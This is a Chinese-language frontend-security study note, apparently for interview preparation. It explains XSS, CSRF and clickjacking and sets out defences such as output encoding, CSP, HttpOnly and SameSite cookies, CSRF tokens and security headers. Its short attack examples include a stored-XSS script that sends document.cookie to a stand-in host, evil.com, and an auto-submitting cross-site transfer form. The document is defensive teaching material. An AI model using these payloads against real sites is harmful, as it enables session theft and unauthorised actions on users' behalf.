## 核心概念

| 攻击类型 | 全称 | 攻击方式 | 危害 |
|---------|------|---------|------|
| **XSS** | Cross-Site Scripting | 注入恶意脚本 | 窃取 Cookie、劫持用户 |
| **CSRF** | Cross-Site Request Forgery | 伪造用户请求 | 冒充用户操作 |
| **点击劫持** | Clickjacking | 透明 iframe 覆盖 | 诱导用户点击 |

## XSS 跨站脚本攻击

### 攻击原理

攻击者将恶意脚本注入页面，在用户浏览器执行。

### 三种类型

| 类型 | 存储位置 | 触发方式 | 危害范围 |
|------|---------|---------|---------|
| **存储型** | 服务器数据库 | 用户访问页面 | 所有访问用户 |
| **反射型** | URL 参数 | 点击恶意链接 | 点击链接的用户 |
| **DOM型** | 前端 JS | 前端直接执行 | 当前用户 |

#### 存储型 XSS（最危险）

```javascript
// 攻击者在评论区提交
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// 其他用户查看评论时，脚本执行，Cookie 被盗
```

#### 反射型 XSS

```
// 恶意链接
https://example.com/search?q=<script>alert('xss')</script>

// 服务端直接将 q 参数输出到页面
// 用户点击链接后，脚本执行
```

#### DOM 型 XSS

```javascript
// 前端代码
const hash = location.hash.slice(1);
document.getElementById('content').innerHTML = hash;

// 攻击 URL
https://example.com/#<img src=x onerror=alert('xss')>
```

### 防御措施

#### 1. 输入过滤（不可靠，仅作辅助）

```javascript
// 简单过滤（容易绕过，不推荐单独使用）
function filterXSS(str) {
  return str.replace(/[<>&"']/g, (char) => ({
    '<': '&lt;',
    '>': '&gt;',
    '&': '&amp;',
    '"': '&quot;',
    "'": '&#x27;'
  }[char]));
}
```

#### 2. 输出编码（核心防御）

```javascript
// 根据输出位置选择编码方式
// HTML 内容：HTML 实体编码
element.textContent = userInput;  // ✅ 自动编码
element.innerHTML = userInput;    // ❌ 危险

// HTML 属性：属性编码
element.setAttribute('data-name', userInput);  // ✅

// JavaScript：JSON 编码
const data = JSON.parse(JSON.stringify(userInput));

// URL：URL 编码
const url = `https://example.com?q=${encodeURIComponent(userInput)}`;
```

#### 3. CSP 内容安全策略

```http
# HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; style-src 'self' 'unsafe-inline'
```

```html
<!-- 或 meta 标签 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

CSP 指令说明：

| 指令 | 作用 |
|------|------|
| `default-src` | 默认策略 |
| `script-src` | JS 来源限制 |
| `style-src` | CSS 来源限制 |
| `img-src` | 图片来源限制 |
| `connect-src` | AJAX/WebSocket 来源 |
| `'self'` | 只允许同源 |
| `'unsafe-inline'` | 允许内联（不推荐） |
| `'nonce-xxx'` | 允许指定 nonce 的内联脚本 |

#### 4. HttpOnly Cookie

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

JS 无法通过 `document.cookie` 读取，防止 Cookie 被盗。

#### 5. 使用安全的 API

```javascript
// ❌ 危险
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// ✅ 安全
element.textContent = userInput;
element.setAttribute('href', sanitizedUrl);
```

## CSRF 跨站请求伪造

### 攻击原理

利用用户已登录的身份，在用户不知情的情况下发送恶意请求。

```
1. 用户登录 bank.com，浏览器保存 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面发起对 bank.com 的请求
4. 浏览器自动携带 bank.com 的 Cookie
5. bank.com 认为是用户本人操作，执行转账
```

### 攻击示例

```html
<!-- evil.com 页面 -->

<!-- GET 请求攻击 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- POST 请求攻击 -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### 防御措施

#### 1. CSRF Token（主流方案）

```html
<!-- 服务端生成 Token 嵌入表单 -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="随机生成的token">
  <input type="text" name="to">
  <input type="number" name="amount">
  <button type="submit">转账</button>
</form>
```

```javascript
// 服务端验证
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // 执行转账
});
```

#### 2. SameSite Cookie

```http
Set-Cookie: sessionId=abc123; SameSite=Strict
```

| 值 | 效果 |
|----|------|
| `Strict` | 完全禁止跨站携带 Cookie |
| `Lax` | 允许导航请求（GET）携带，禁止 POST |
| `None` | 允许跨站（需配合 Secure） |

#### 3. 验证 Referer / Origin

```javascript
app.post('/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;
  if (!origin || !origin.startsWith('https://bank.com')) {
    return res.status(403).send('Invalid origin');
  }
  // 执行转账
});
```

#### 4. 双重 Cookie 验证

```javascript
// 前端：从 Cookie 读取 token 放入请求头
const csrfToken = getCookie('csrf_token');
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken }
});

// 服务端：验证请求头中的 token 与 Cookie 中的一致
```

## 点击劫持

### 攻击原理

将目标网站嵌入透明 iframe，覆盖在诱导页面上方，用户以为点击的是诱导页面，实际点击的是 iframe 中的按钮。

### 防御措施

#### 1. X-Frame-Options

```http
X-Frame-Options: DENY          # 禁止任何嵌套
X-Frame-Options: SAMEORIGIN    # 只允许同源嵌套
```

#### 2. CSP frame-ancestors

```http
Content-Security-Policy: frame-ancestors 'self'
```

#### 3. JavaScript 检测

```javascript
// 检测是否被嵌套
if (window.top !== window.self) {
  window.top.location = window.self.location;
}
```

## 其他安全措施

### HTTPS

- 防止数据被窃听和篡改
- 现代浏览器要求 HTTPS 才能使用某些 API（Service Worker、Geolocation 等）

### Subresource Integrity (SRI)

验证外部资源完整性，防止 CDN 被劫持：

```html
<script src="https://cdn.example.com/lib.js"
  integrity="sha384-xxxx"
  crossorigin="anonymous">
</script>
```

### 安全响应头汇总

```http
# 防 XSS
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block  # 旧版浏览器

# 防点击劫持
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

# 防 MIME 类型嗅探
X-Content-Type-Options: nosniff

# 强制 HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains

# 防止 Referer 泄露
Referrer-Policy: strict-origin-when-cross-origin
```

## 常见面试题

### Q1：XSS 和 CSRF 的区别？

| 对比项 | XSS | CSRF |
|--------|-----|------|
| 攻击目标 | 用户浏览器 | 服务器 |
| 攻击方式 | 注入脚本执行 | 伪造用户请求 |
| 是否需要用户登录 | 不一定 | 需要 |
| 防御核心 | 输出编码 + CSP | Token + SameSite |

### Q2：如何防止 XSS？

1. **输出编码**：根据上下文（HTML/JS/URL）正确编码
2. **CSP**：限制脚本来源
3. **HttpOnly**：保护 Cookie
4. **使用安全 API**：`textContent` 代替 `innerHTML`

### Q3：CSRF Token 为什么能防御 CSRF？

- 攻击者无法获取 Token（受同源策略保护）
- 即使发起跨站请求，也无法携带正确的 Token
- 服务端验证 Token 不匹配，拒绝请求

### Q4：SameSite=Lax 和 Strict 的区别？

- **Strict**：任何跨站请求都不携带 Cookie
- **Lax**：导航请求（如点击链接）可以携带，POST/AJAX 不携带

### Q5：CSP 的作用是什么？

- 限制资源加载来源（脚本、样式、图片等）
- 禁止内联脚本执行
- 禁止 eval 等危险函数
- 上报违规行为
